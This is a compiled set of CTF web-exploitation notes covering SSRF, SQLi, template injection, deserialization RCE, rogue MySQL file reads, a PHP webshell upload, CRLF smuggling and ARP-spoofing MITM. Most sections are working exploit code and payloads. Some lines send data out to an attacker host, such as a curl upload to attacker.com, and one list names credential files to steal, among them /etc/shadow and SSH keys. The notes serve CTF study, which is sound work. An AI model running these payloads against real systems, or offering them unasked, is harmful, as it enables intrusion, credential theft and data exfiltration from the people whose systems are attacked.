**Key insight:** When an INSERT query has multiple injectable fields but one is length-limited, use the limited field to open a `concat(` expression and the unlimited field to close it with an arbitrary subquery. This "column shift" technique moves the data extraction from the length-restricted field to the unrestricted one. Also works with `CASE WHEN` or other SQL expressions that span across field boundaries.

---

## Session Cookie Forgery via Timestamp-Seeded PRNG (CyberSecurityRumble 2016)

**Pattern (Illuminati):** Session cookies constructed as `random_int-user_id`, where `random_int` is seeded by the user's last login timestamp. Extract the admin's timestamp via SQLi, reproduce the PRNG to forge their cookie.

```python
import random

# 1. Extract admin login timestamp via SQLi
admin_timestamp = 1229569179  # from: SELECT last_login FROM users WHERE id=209

# 2. Seed PRNG with timestamp
random.seed(admin_timestamp)

# 3. Generate the same random int the server produced
cookie_random = random.randint(0, 2**31)

# 4. Forge admin cookie
admin_cookie = f"{cookie_random}-209"
# Result: "1229569179-209"
```

**Key insight:** Timestamps used as PRNG seeds for session tokens create a deterministic oracle. If the login timestamp is leaked (via SQLi, error messages, or API responses), the full token is reproducible. This pattern appears whenever session randomness depends on a single predictable seed value (time, PID, counter). Check for `random.seed(time())` or `srand(time(NULL))` in session generation code.

---

## SSRF via parse_url/curl URL Parsing Discrepancy (33C3 CTF 2016)

**Pattern (list0r):** PHP `parse_url()` and curl interpret URLs with multiple `@` symbols differently. The URL `http://what:ever@127.0.0.1:80@allowed.host/path` causes PHP to see `host = allowed.host` (passing a CIDR/domain whitelist check), while curl resolves to `127.0.0.1:80` (treating the second `@` as literal), achieving SSRF to localhost.

```php
// PHP parse_url behavior:
parse_url("http://what:ever@127.0.0.1:80@allowed.host/path");
// => ['host' => 'allowed.host', 'user' => 'what', ...]

// curl behavior with same URL:
// Connects to 127.0.0.1:80 (first @ delimits credentials)
// "ever@127.0.0.1:80" parsed as password, but curl connects to first IP

// Exploit: bypass CIDR blacklist by making parse_url see whitelisted host
$url = "http://x:x@127.0.0.1:80@" . $allowed_domain . "/secret/flag";
// parse_url sees $allowed_domain -> passes check
// curl connects to 127.0.0.1:80 -> SSRF achieved
```

**Key insight:** URL parsers disagree on how to handle multiple `@` symbols. This is distinct from the single-`@` bypass (EKOPARTY 2016) — here the double-`@` exploits a different parsing ambiguity where `parse_url` takes the last `@` as the userinfo delimiter while curl uses the first. Test both variants when facing URL-based SSRF filters.

---

## LaTeX RCE via mpost Restricted write18 Bypass (33C3 CTF 2016)

**Pattern (pdfmaker):** When `pdflatex` runs with `write18` in restricted mode (only whitelisted commands like `mpost` allowed), exploit `mpost`'s `-tex` flag to specify an alternative TeX processor — setting it to `bash -c (command)` achieves shell execution. Use `${IFS}` as space replacement since mpost's argument parsing strips spaces.

```latex
% Create a MetaPost file via LaTeX
\begin{filecontents}{test.mp}
beginfig(1); endfig; end;
\end{filecontents}

% Execute mpost with bash as the "TeX processor"
\immediate\write18{mpost -ini "-tex=bash -c (cat${IFS}/flag)>out.log" "test.mp"}

% Read the output back into the PDF
\input{out.log}
```

**Key insight:** `mpost` is whitelisted by restricted `write18` because it's needed for MetaPost diagrams. But its `-tex` flag allows specifying an arbitrary program as the "TeX processor," including `bash`. This transforms a restricted shell escape into full RCE. `${IFS}` replaces spaces to work within the quoted argument.

---

## ElasticSearch Groovy script_fields RCE via SSRF (VolgaCTF 2017)

**Pattern:** When SSRF reaches an internal ElasticSearch instance (default port 9200), Groovy scripting in `script_fields` enables remote code execution. ElasticSearch versions before 5.0 allowed inline Groovy scripts by default.

```bash
# SSRF payload to ElasticSearch internal API
curl 'http://localhost:9200/_search' -d '{
  "script_fields": {
    "exec": {
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"
    }
  }
}'

# Read a specific file
curl 'http://localhost:9200/_search' -d '{
  "script_fields": {
    "read": {
      "script": "new java.io.File(\"/flag.txt\").text"
    }
  }
}'

# For blind RCE, exfiltrate via curl upload
curl 'http://localhost:9200/_search' -d '{
  "script_fields": {
    "exfil": {
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"curl --upload-file /flag attacker.com:4042\").getText()"
    }
  }
}'
```

**Via SSRF (URL-encoded for GET parameter):**
```python
import requests
import urllib.parse

es_payload = '{"script_fields":{"exec":{"script":"new java.io.File(\\"/flag.txt\\").text"}}}'
ssrf_url = f"http://localhost:9200/_search?source={urllib.parse.quote(es_payload)}&source_content_type=application/json"

# Through SSRF endpoint
r = requests.get(f"http://target/fetch?url={urllib.parse.quote(ssrf_url)}")
print(r.text)
```

**Detection:** SSRF vulnerability + internal service on port 9200. Confirm with `http://localhost:9200/` (returns ES version info) or `http://localhost:9200/_cat/indices` (lists indices).

**Key insight:** ElasticSearch pre-5.0 exposed Groovy scripting via the `_search` API. Even without direct access, SSRF to port 9200 enables full RCE through `script_fields`. Modern ES versions disabled inline scripting by default. When testing SSRF, always probe port 9200 -- ElasticSearch is a common internal service with powerful script execution capabilities.

---

### Rogue MySQL Server LOAD DATA LOCAL File Read (VolgaCTF 2018)

**Pattern:** When a service connects to your controlled MySQL server with `LOAD DATA LOCAL` enabled, send a rogue response requesting arbitrary file reads from the client machine. The MySQL protocol allows the server to request the client to send any local file during the `LOAD DATA LOCAL INFILE` handshake, regardless of what query the client intended to execute.

**How it works:**
1. Victim application connects to attacker-controlled MySQL server (e.g., via SSRF or misconfigured DB host)
2. Attacker server completes the handshake normally
3. When the client sends any query, the rogue server responds with a file transfer request packet
4. The client reads the requested local file and sends its contents to the server

```python
# Rogue MySQL server — simplified core logic
import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 3306))
server.listen(1)
conn, addr = server.accept()

# Send server greeting (MySQL handshake)
greeting = bytes.fromhex(
    '4a0000000a352e362e32382d'  # version 5.6.28
    '307562756e747530'          # ubuntu0
    '2e31342e30342e31'          # .14.04.1
    '001d000000'                # connection id
    '2a5e2a683e6a2b29'          # auth plugin data part 1
    '00fff70800'                # capability flags
    '210000000000000000000000'  # more fields
    '00'
    '282a4e3b3a592635254a2944'  # auth plugin data part 2
    '00'
)
conn.send(greeting)

# Receive client auth response
conn.recv(4096)

# Send OK packet (auth success)
conn.send(bytes.fromhex('0700000200000002000000'))

# Wait for client to send a query
conn.recv(4096)

# Check client capability bit "Can Use LOAD DATA LOCAL: Set"
# Send rogue file read request for /etc/passwd
dump_etc_passwd = bytes.fromhex('0c000001fb2f6574632f706173737764')
conn.send(dump_etc_passwd)  # rogue MySQL file read request

# Receive file contents from client
file_data = conn.recv(65535)
print(f"[+] Received file contents:\n{file_data.decode(errors='replace')}")

conn.close()
```

**Useful files to request:**
```text
/etc/passwd                    # User enumeration
/etc/shadow                    # Password hashes (if client runs as root)
/proc/self/environ             # Environment variables with secrets
/var/www/html/config.php       # Application config with DB credentials
/home/user/.ssh/id_rsa         # SSH private keys
/flag.txt                      # CTF flag
```

**Key insight:** A rogue MySQL server can request the connecting client to send any local file via the LOAD DATA LOCAL protocol, regardless of what query the client intended to execute. This works because the MySQL protocol allows the server to respond to any client query with a file transfer request. Look for challenges where you can control the MySQL host a service connects to (SSRF, config injection, DNS rebinding). The client must have `LOAD DATA LOCAL` enabled (default in many MySQL client libraries).

<!-- merged: webapp/injection/server-side-advanced.md -->

# CTF Web - Advanced Server-Side Techniques (Part 3)

CVE-era and 2018-era advanced server-side techniques (CSAW, 35C3, ASIS, PlaidCTF). For parts 1-2, see [server-side-advanced.md](server-side-advanced.md) and [server-side-advanced-2.md](server-side-advanced-2.md).

## Table of Contents
- [WAV Polyglot Upload Bypass via .wave Extension (PlaidCTF 2018)](#wav-polyglot-upload-bypass-via-wave-extension-plaidctf-2018)
- [Multi-Slash URL Parser `path.startswith` Bypass (CSAW 2018 Finals)](#multi-slash-url-parser-pathstartswith-bypass-csaw-2018-finals)
- [Xalan XSLT math:random() Seed Guess (35C3 2018)](#xalan-xslt-mathrandom-seed-guess-35c3-2018)
- [SoapClient _user_agent CRLF Method Smuggling (35C3 2018)](#soapclient-_user_agent-crlf-method-smuggling-35c3-2018)
- [`gopher://` No-Host URL Scheme Bypass (35C3 2018)](#gopher-no-host-url-scheme-bypass-35c3-2018)
- [SSRF Credential Leak via Attacker-Specified Outbound URL (ASIS Finals 2018)](#ssrf-credential-leak-via-attacker-specified-outbound-url-asis-finals-2018)

---

---

## WAV Polyglot Upload Bypass via .wave Extension (PlaidCTF 2018)

**Pattern (idIoT: Action):** Site accepts `ogg/wav/wave/webm/mp3` uploads and validates by parsing the RIFF/WAVE header. CSP is `script-src 'self'`, so inline XSS fails, but a same-origin `<script src=...>` to an uploaded file would run. Browsers refuse to load responses whose Content-Type starts with `audio/`, yet Apache on many distros has no MIME mapping for the `.wave` extension and serves it as the default (usually `application/octet-stream` or with no `Content-Type`).

**Exploit build:**
1. Construct a file whose first bytes parse as a valid RIFF/WAVE container but whose `data` chunk contents open a JavaScript block comment and embed the payload.
2. Save with extension `.wave` (not `.wav`) so Apache does not label it as audio.
3. Inject `<script src="/uploads/evil.wave"></script>` via the existing XSS sink — the browser now executes the script from a same-origin URL, satisfying `script-src 'self'`.

```text
RIFF=1/*WAVEfmt ..........]................LIST....INFO
ISFT....Lavf57.83.100.data........................
........*/ ; alert(1);
```
Hex view (truncated): the first 4 bytes `52 49 46 46` still form `RIFF`; the quirky length field `3d 31 2f 2a` (`=1/*`) is valid for WAV parsers but also opens a JS comment that runs until the `*/ ;alert(1);` tail at the end of the `data` chunk.

**Key insight:** File-upload filters that only check magic bytes or MIME based on extension are defeated by any extension the web server has no explicit mapping for. Test each permitted extension against the server's MIME database (`mime.types`) — whichever one falls through to `application/octet-stream` becomes a script gadget under `script-src 'self'`. Fix by enforcing a strict response `Content-Type` for user uploads (e.g., `application/octet-stream` + `Content-Disposition: attachment`).

**References:** PlaidCTF 2018 — writeup 10018

---

## Multi-Slash URL Parser `path.startswith` Bypass (CSAW 2018 Finals)

**Pattern:** Server code rejects URLs whose parsed path starts with `/flaginfo`, but most HTTP stacks resolve consecutive slashes equivalently. Adding one extra slash shifts the parsed path to `//flaginfo`, breaking `startswith("/flaginfo")` while still routing to the real endpoint.

```text
# Filtered
http://127.0.0.1:5000/flaginfo
# Allowed
http://127.0.0.1:5000///flaginfo
```

**Key insight:** Filters that check the parsed URL differ from the resolver that ultimately routes the request. Always test `///`, `/./`, `%2f`, and `http:/127.0.0.1` permutations when the filter is a string-comparison, not a structural match.

**References:** CSAW 2018 Finals — NekoCat, writeups 12130, 12144

---

## Xalan XSLT math:random() Seed Guess (35C3 2018)

**Pattern:** Xalan's `math:random()` extension uses C `srand(time(NULL))`. The challenge leaks 5 consecutive random values; brute-force 3 consecutive seeds (`t-1`, `t`, `t+1`) with libc `rand()` to find the one matching the leak, then predict the next value.

```c
for (long base = time(NULL) - 1; base <= time(NULL) + 1; base++) {
    srand(base);
    for (int j = 0; j < 5; j++) {
        long long v = llround((double)rand() / RAND_MAX * 4294967296.0);
        /* compare with leaked values */
    }
}
```

**Key insight:** Any XSLT engine that exposes math extensions usually proxies straight to libc rand/srand; seeds are second-granularity time values and fall to a 3-value brute force.

**References:** 35C3 CTF 2018 — Juggle, writeup 12803

---

## SoapClient _user_agent CRLF Method Smuggling (35C3 2018)

**Pattern:** PHP's `SoapClient` lets user code set the `_user_agent` property. That string is interpolated into the HTTP request without CRLF filtering, so injecting `\r\n\r\n` followed by a full HTTP request smuggles a *second* request out of the same TCP connection — turning a POST-only primitive into a GET (or any other method) hitting a localhost-restricted admin endpoint.

```php
$c = new SoapClient(null, [
    'location'   => 'http://target/soap',
    'uri'        => 'x',
    'user_agent' => "x\r\nX-Forwarded-For: 127.0.0.1\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n"
]);
$c->__soapCall('x', []);
```

**Key insight:** Any serialization gadget that lets you set a "magic" HTTP header string in a deserialized object becomes an HTTP smuggler. `SoapClient->_user_agent` and `SoapClient->_cookies` are the typical PHP gadgets for this.

**References:** 35C3 CTF 2018 — post, writeup 12808

---

## `gopher://` No-Host URL Scheme Bypass (35C3 2018)

**Pattern:** An allowlist validator only enforces the scheme check when the URL has a host (`parsed.scheme in ('http','https') if parsed.host`). `gopher:///host:port/data` leaves the host empty in some parsers, skipping the check entirely, so the request backend uses gopher to talk to any TCP service — MSSQL, Redis, SMTP.

```text
gopher:///127.0.0.1:1433/_<raw TDS bytes>
```

**Key insight:** Always test every URL scheme against the validator both with and without `//host` because parser/validator mismatches are asymmetric. `gopher:///x`, `file:///x`, and `jar:file:///x` are the common scheme bypasses.

**References:** 35C3 CTF 2018 — post, writeup 12808

---

## SSRF Credential Leak via Attacker-Specified Outbound URL (ASIS Finals 2018)

**Pattern:** Server fetches resources from a user-controlled URL and attaches its own HTTP Basic credentials to the request. Point the URL at an attacker-controlled host; the inbound request arrives with `Authorization: Basic <base64(user:pass)>`.

```http
# Listener (attacker side)
nc -lvnp 80

# Victim sends:
GET / HTTP/1.1
Host: attacker.example
Authorization: Basic YmlnYnJvdGhlcjo0UWozcmM0WmhOUUt2N1J6
```

**Key insight:** Any SSRF where the client library uses per-request credentials (`requests.auth`, `urllib3 auth_header`, Python `http.client` default credentials) leaks them if the attacker picks the target URL. Strip `Authorization` on redirects and never attach credentials by default.

**References:** ASIS CTF Finals 2018 — Gunshop 2, writeup 12420

<!-- merged: webapp/injection/server-side-advanced.md -->

# Server-Side Advanced Techniques (Part 4)

## Table of Contents
- [WeasyPrint SSRF & File Read (CVE-2024-28184, Nullcon 2026)](#weasyprint-ssrf--file-read-cve-2024-28184-nullcon-2026)
  - [Variant 1: Blind SSRF via Attachment Oracle](#variant-1-blind-ssrf-via-attachment-oracle)
  - [Variant 2: Local File Read via file:// Attachment](#variant-2-local-file-read-via-file-attachment)
- [MongoDB Regex Injection / $where Blind Oracle (Nullcon 2026)](#mongodb-regex-injection--where-blind-oracle-nullcon-2026)
- [Pongo2 / Go Template Injection via Path Traversal (Nullcon 2026)](#pongo2--go-template-injection-via-path-traversal-nullcon-2026)
- [ZIP Upload with PHP Webshell (Nullcon 2026)](#zip-upload-with-php-webshell-nullcon-2026)
- [basename() Bypass for Hidden Files (Nullcon 2026)](#basename-bypass-for-hidden-files-nullcon-2026)
- [wget CRLF Injection for SSRF-to-SMTP (SECCON 2017)](#wget-crlf-injection-for-ssrf-to-smtp-seccon-2017)
- [Gopher SSRF to MySQL Blind SQLi (34C3 CTF 2017, AceBear 2018)](#gopher-ssrf-to-mysql-blind-sqli-34c3-ctf-2017-acebear-2018)
- [React Server Components Flight Protocol RCE (Ehax 2026)](#react-server-components-flight-protocol-rce-ehax-2026)
  - [Step 1 — Identify RSC via HTTP headers](#step-1--identify-rsc-via-http-headers)
  - [Step 2 — Exploit Flight deserialization for RCE](#step-2--exploit-flight-deserialization-for-rce)
  - [Step 3 — Exfiltrate data via NEXT_REDIRECT](#step-3--exfiltrate-data-via-next_redirect)
  - [Step 4 — Bypass WAF keyword filters](#step-4--bypass-waf-keyword-filters)
  - [Step 5 — Post-RCE enumeration](#step-5--post-rce-enumeration)
  - [Step 6 — Lateral movement to internal services](#step-6--lateral-movement-to-internal-services)
- [AMQP/TLS Interception via sslsplit + arpspoof (TAMUctf 2019)](#amqptls-interception-via-sslsplit--arpspoof-tamuctf-2019)
- [CairoSVG XXE via Oversized width= (BSidesSF 2019)](#cairosvg-xxe-via-oversized-width-bsidessf-2019)
- [Bazaar (.bzr) Repository Reconstruction via bzr check Loop (STEM CTF 2019)](#bazaar-bzr-repository-reconstruction-via-bzr-check-loop-stem-ctf-2019)

See also: [server-side-advanced.md](server-side-advanced.md) for Part 1 (ExifTool DjVu, Go rune/byte, ZIP symlink, path traversal bypasses, Nginx alias, Unicode homoglyph, Ruby Regexp.escape, /dev/fd, Flask/Werkzeug debug, XXE DTD filter bypass, %2f bypass). See also: [server-side-advanced-2.md](server-side-advanced-2.md) for Part 2. See also: [server-side-advanced-3.md](server-side-advanced-3.md) for Part 3.

---

## WeasyPrint SSRF & File Read (CVE-2024-28184, Nullcon 2026)

**Pattern (Web 2 Doc 1/2):** App converts user-supplied URL to PDF using WeasyPrint. Attachment fetches bypass internal header checks and can read local files.

### Variant 1: Blind SSRF via Attachment Oracle
WeasyPrint `<a rel="attachment" href="...">` fetches the URL in a separate codepath without `X-Fetcher` or similar internal headers. If the target is localhost-only, the attachment fetch succeeds from localhost.

**Boolean oracle:** Embedded file appears in PDF only when target returns HTTP 200:
```python
# Check for embedded attachment in PDF
def has_attachment(pdf_bytes):
    return b"/Type /EmbeddedFile" in pdf_bytes

# Blind extraction via charCodeAt oracle
for i in range(flag_len):
    for ch in charset:
        html = f'<a rel="attachment" href="http://127.0.0.1:5000/admin/flag?i={i}&c={ch}">A</a>'
        pdf = convert_url_to_pdf(host_html(html))
        if has_attachment(pdf):
            flag += ch; break
```

### Variant 2: Local File Read via file:// Attachment
```html
<!-- Host this HTML, submit URL to converter -->
<link rel="attachment" href="file:///flag.txt">
```
**Extract:** `pdfdetach -save 1 -o flag.txt output.pdf`

**Key insight:** WeasyPrint processes `<link rel="attachment">` and `<a rel="attachment">` -- both can reference `file://` or internal URLs. The attachment is embedded in the PDF as a file stream.

---

## MongoDB Regex Injection / $where Blind Oracle (Nullcon 2026)

**Pattern (CVE DB):** Search input interpolated into `/.../i` regex in MongoDB query. Break out of regex to inject arbitrary JS conditions.

**Injection payload:**
```text
a^/)||(<JS_CONDITION>)&&(/a^
```
This breaks the regex context and injects a boolean condition. Result count reveals truth value.

**Binary search extraction:**
```python
def oracle(condition):
    # Inject into regex context
    payload = f"a^/)||(({condition}))&&(/a^"
    html = post_search(payload)
    return parse_result_count(html) > 0

# Find flag length
lo, hi = 1, 256
while lo < hi:
    mid = (lo + hi + 1) // 2
    if oracle(f"this.product.length>{mid}"): lo = mid
    else: hi = mid - 1
length = lo + 1

# Extract each character
for i in range(length):
    l, h = 31, 126
    while l < h:
        m = (l + h + 1) // 2
        if oracle(f"this.product.charCodeAt({i})>{m}"): l = m
        else: h = m - 1
    flag += chr(l + 1)
```

**Detection:** Unsanitized input in MongoDB `$regex` or `$where`. Test with `a/)||true&&(/a` vs `a/)||false&&(/a` -- different result counts confirm injection.

---

## Pongo2 / Go Template Injection via Path Traversal (Nullcon 2026)

**Pattern (WordPress Static Site Generator):** Go app renders templates with Pongo2. Template parameter has path traversal allowing rendering of uploaded files.

**Attack chain:**
1. Upload file containing: `{% include "/flag.txt" %}`
2. Get upload ID from session cookie (base64 decode, extract hex ID)
3. Request render with traversal: `/generate?template=../uploads/<id>/pwn`

**Pongo2 SSTI payloads:**
```text
{% include "/etc/passwd" %}
{% include "/flag.txt" %}
{{ "test" | upper }}
```

**Detection:** Go web app with template rendering + file upload. Check for `pongo2`, `jet`, or standard `html/template` in source.

---

## ZIP Upload with PHP Webshell (Nullcon 2026)

**Pattern (virus_analyzer):** App accepts ZIP uploads, extracts to web-accessible directory, serves extracted files.

**Exploit:**
```bash
# Create PHP webshell
echo '<?php echo file_get_contents("/flag.txt"); ?>' > shell.php
zip payload.zip shell.php
curl -F 'zipfile=@payload.zip' http://target/
# Access: http://target/uploads/<id>/shell.php
```

**Variants:**
- If `system()` blocked ("Cannot fork"), use `file_get_contents()` or `readfile()`
- If `.php` blocked, try `.phtml`, `.php5`, `.phar`, or upload `.htaccess` first
- Race condition: file may be deleted after extraction -- access immediately

---

## basename() Bypass for Hidden Files (Nullcon 2026)

**Pattern (Flowt Theory 2):** App uses `basename()` to prevent path traversal in file viewer, but it only strips directory components. Hidden/dot files in the same directory are still accessible.

**Exploit:**
```bash
# basename() allows .lock, .htaccess, etc.
curl "http://target/?view_receipt=.lock"
# .lock reveals secret filename
curl "http://target/?view_receipt=secret_XXXXXXXX"
```

**Key insight:** `basename()` is NOT a security function -- it only extracts the filename component. It doesn't filter hidden files (`.foo`), backup files (`file~`), or any filename without directory separators.

---

## wget CRLF Injection for SSRF-to-SMTP (SECCON 2017)

**Pattern:** wget versions before 1.17.1 (notably 1.14, common on CentOS 7) do not sanitize CRLF characters (`%0d%0a`) in the HTTP Host header. When an SSRF allows controlling the URL that wget fetches, CRLF injection into the hostname allows injecting arbitrary protocol commands. Targeting an internal SMTP server on port 25 enables sending arbitrary emails.

```text
# CRLF-injected URL targeting internal SMTP on port 25:
# Key: the port :25/ must come at the END to avoid "Bad port number" errors
http://127.0.0.1%0D%0AHELO%20x%0D%0AMAIL%20FROM%3A%3Cattacker%40x.com%3E%0D%0ARCPT%20TO%3A%3Croot%3E%0D%0ADATA%0D%0ASubject%3A%20give%20me%20flag%0D%0Aabc%0D%0A.%0D%0A:25/
```

```python
import requests
import urllib.parse

# Build the CRLF-injected SMTP conversation
smtp_commands = "\r\n".join([
    "HELO x",
    "MAIL FROM:<attacker@x.com>",
    "RCPT TO:<root>",
    "DATA",
    "Subject: give me flag",
    "",
    "Send me the flag please",
    ".",
])

# URL-encode the SMTP commands for injection into the hostname
encoded = urllib.parse.quote(smtp_commands, safe='')

# Port must be at the end to avoid wget "Bad port number" error
ssrf_url = f"http://127.0.0.1{encoded}:25/"

# Trigger the SSRF
requests.post("http://target/fetch", data={"url": ssrf_url})
# wget connects to 127.0.0.1:25 and sends the SMTP commands as part of the HTTP request
# The SMTP server processes the injected commands and delivers the email
```

**Key insight:** wget before 1.17.1 did not sanitize CRLF in the Host header. When SSRF reaches an internal SMTP service, CRLF injection enables sending arbitrary emails. Place the port at the END of the injected string to avoid "Bad port number" errors. This technique extends to any line-based protocol accessible via SSRF (FTP, Redis, memcached). See also [server-side.md](server-side.md#ssrf) for other SSRF techniques.

---

## Gopher SSRF to MySQL Blind SQLi (34C3 CTF 2017, AceBear 2018)

**Pattern:** When SSRF allows the `gopher://` protocol, craft raw MySQL protocol packets to communicate with a local MySQL instance that uses passwordless authentication (common in CTF setups). Combine with time-based blind SQLi via `SLEEP()` to extract data.

```python
import urllib.parse
import requests
import time

# Step 1: Capture a real MySQL session with tcpdump
# tcpdump -i lo port 3306 -w mysql.pcap
# Connect to MySQL normally: mysql -u root
# Execute a simple query, then disconnect
# Extract the client auth packet and query packet bytes from the pcap

# Step 2: Build the gopher payload
# MySQL auth packet (handshake response) - extract from pcap
auth_packet = bytearray([
    0x48, 0x00, 0x00, 0x01,  # packet length + sequence
    0x85, 0xa6, 0x03, 0x00,  # client capabilities
    # ... remaining auth packet bytes from tcpdump capture
])

# MySQL query packet
def build_query_packet(sql):
    payload = b'\x03' + sql.encode()  # 0x03 = COM_QUERY
    length = len(payload)
    # MySQL packet: 3-byte length (little-endian) + 1-byte sequence number
    header = length.to_bytes(3, 'little') + b'\x00'
    return header + payload

# Step 3: Time-based blind extraction
flag = ""
for pos in range(1, 50):
    for char in "abcdefghijklmnopqrstuvwxyz0123456789_{}-":
        query = f"SELECT IF(SUBSTRING((SELECT flag FROM secrets LIMIT 1),{pos},1)='{char}',SLEEP(3),0)"
        query_packet = build_query_packet(query)

        # Combine auth + query, URL-encode for gopher
        raw_data = bytes(auth_packet) + bytes(query_packet)
        encoded = urllib.parse.quote(raw_data, safe='')

        # Double-encode if the SSRF handler URL-decodes once
        double_encoded = urllib.parse.quote(encoded, safe='')

        gopher_url = f"gopher://127.0.0.1:3306/_{double_encoded}"

        start = time.time()
        requests.get("http://target/fetch", params={"url": gopher_url})
        elapsed = time.time() - start

        if elapsed > 3.0:
            flag += char
            print(f"Flag so far: {flag}")
            break

print(f"Final flag: {flag}")
```

**Key insight:** `gopher://` sends raw TCP data, enabling communication with any TCP service. Capture a legitimate MySQL session with `tcpdump`, then replay the auth + query bytes via gopher. Use passwordless MySQL accounts (common in CTF setups). Double-URL-encode the payload when the SSRF handler URL-decodes once. This technique also works against PostgreSQL, Redis, and other TCP services accessible from the SSRF context. See also [sql-injection.md](sql-injection.md) for SQL injection techniques.

---

## React Server Components Flight Protocol RCE (Ehax 2026)

**Pattern (Flight Risk):** Next.js app using React Server Components (RSC). The Flight protocol deserializes client-sent objects on the server. A crafted fake Flight chunk exploits the constructor chain (`constructor → constructor → Function`) for arbitrary code execution (CVE-2025-55182).

### Step 1 — Identify RSC via HTTP headers

Intercept form submissions in the Network tab. RSC-specific headers:
```http
POST / HTTP/1.1
Next-Action: 7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd
Accept: text/x-component
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D
Content-Type: multipart/form-data; boundary=----x
```

Confirm the server function name in client JS bundles:
```javascript
createServerReference("7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd", callServer, void 0, findSourceMapURL, "greetUser")
```

### Step 2 — Exploit Flight deserialization for RCE

Craft a fake Flight chunk in the multipart form body. The `_prefix` field contains the payload. The constructor chain (`constructor → constructor → Function`) enables arbitrary JavaScript execution on the server.

Request structure:
```http
POST / HTTP/1.1
Host: target
Next-Action: <action_hash>
Accept: text/x-component
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="0"

THE FAKE FLIGHT CHUNK HERE
------x
Content-Disposition: form-data; name="1"

"$@0"
------x--
```

### Step 3 — Exfiltrate data via NEXT_REDIRECT

Next.js uses `NEXT_REDIRECT` errors internally for navigation. Abuse this to exfiltrate data through the `x-action-redirect` response header:

```javascript
throw Object.assign(new Error('NEXT_REDIRECT'), {
  digest: `NEXT_REDIRECT;push;/login?a=${encodeURIComponent(RESULT)};307;`
});
```

The server responds with:
```http
HTTP/1.1 303 See Other
x-action-redirect: /login?a=<exfiltrated_data>;push
```

Example — confirm RCE with `process.pid`:
```javascript
throw Object.assign(new Error('NEXT_REDIRECT'), {
  digest: `NEXT_REDIRECT;push;/login?a=${process.pid};307;`
});
// Response: x-action-redirect: /login?a=1;push
```

### Step 4 — Bypass WAF keyword filters

When keywords like `child_process`, `execSync`, `mainModule` are blocked (403 response with "WAF Alert"):

1. **String concatenation:**
   ```javascript
   p['main'+'Module']['requ'+'ire']('chi'+'ld_pro'+'cess')
   ```

2. **Hex encoding:**
   ```javascript
   '\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'  // child_process
   '\x65\x78\x65\x63\x53\x79\x6e\x63'                        // execSync
   ```

3. **Combined in payload:**
   ```javascript
   var p=process;
   var m=p['main'+'Module'];
   var r=m['requ'+'ire'];
   var c=r('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73');
   var o=c['\x65\x78\x65\x63\x53\x79\x6e\x63']('id').toString();
   throw Object.assign(new Error('NEXT_REDIRECT'),
     {digest:`NEXT_REDIRECT;push;/login?a=${encodeURIComponent(o)};307;`});
   ```

### Step 5 — Post-RCE enumeration

```javascript
// Working directory
process.cwd()                        // → /app

// Process arguments
process.argv                         // → /usr/local/bin/node,/app/server.js

// List files
process.mainModule.require('fs').readdirSync(process.cwd()).join(',')

// Read files
process.mainModule.require('fs').readFileSync('vault.hint').toString('hex')

// Check available modules
Object.keys(process.mainModule.require('http'))
```

### Step 6 — Lateral movement to internal services

After discovering internal services (e.g., from hint files):
```javascript
// Use nc to reach internal HTTP services
var p=process;var m=p['main'+'Module'];var r=m['requ'+'ire'];
var c=r('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73');
var o=c['\x65\x78\x65\x63\x53\x79\x6e\x63'](
  'printf "GET /flag.txt HTTP/1.1\\r\\nHost: internal-vault\\r\\n\\r\\n" | nc internal-vault 9009'
).toString();
throw Object.assign(new Error('NEXT_REDIRECT'),
  {digest:`NEXT_REDIRECT;push;/login?a=${encodeURIComponent(o)};307;`});
```

**Key insight:** The NEXT_REDIRECT mechanism provides a reliable out-of-band data exfiltration channel through the `x-action-redirect` response header. Combined with WAF bypass via string concatenation and hex encoding, this enables full RCE even in filtered environments.

**Full exploit chain:** Identify RSC headers → craft fake Flight chunk → bypass WAF → achieve RCE → enumerate filesystem → discover internal services → lateral movement via `nc` to retrieve flag.

**Detection:** `Accept: text/x-component` + `Next-Action` header in requests, `createServerReference()` in client JS, Next.js Server Actions with user-controlled form data.

---

## AMQP/TLS Interception via sslsplit + arpspoof (TAMUctf 2019)

**Pattern:** A web shim posts a JSON job `{"user": "alice", "code": "..."}` to an internal RabbitMQ broker on `5671/tcp` (AMQPS). Clients almost never pin certificates, so ARP-spoofing both hosts onto the attacker and terminating TLS with sslsplit yields plaintext AMQP frames you can log and rewrite (swap `"alice"` for `"root"` mid-stream to escalate privileges).

```bash
# 1. Sit between the web server and the broker (both ways)
arpspoof -i eth0 -t 172.30.0.2 172.30.0.4 &
arpspoof -i eth0 -t 172.30.0.4 172.30.0.2 &

# 2. Redirect the AMQP port into sslsplit
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 5671 -j REDIRECT --to-ports 1234
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 1826 -key ca.key -out ca.crt
mkdir /tmp/sslsplit logdir
sudo sslsplit -D -l connections.log -j /tmp/sslsplit -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 1234
cat logdir/*    # shows plaintext AMQP frames with the JSON body

# 3. For on-the-fly rewriting, patch mitmproxy's raw TCP layer:
#    mitmproxy/proxy/protocol/rawtcp.py, RawTCPLayer._handle_server_message():
#        x = buf[:size].tobytes().replace(b'"user": "alice",', b'"user": "root", ')
#        tcp_message = tcp.TCPMessage(dst == server, x)
mitmproxy --mode transparent --listen-port 1234 --ssl-insecure \
          --tcp-hosts 172.30.0.2 --tcp-hosts 172.30.0.4
```

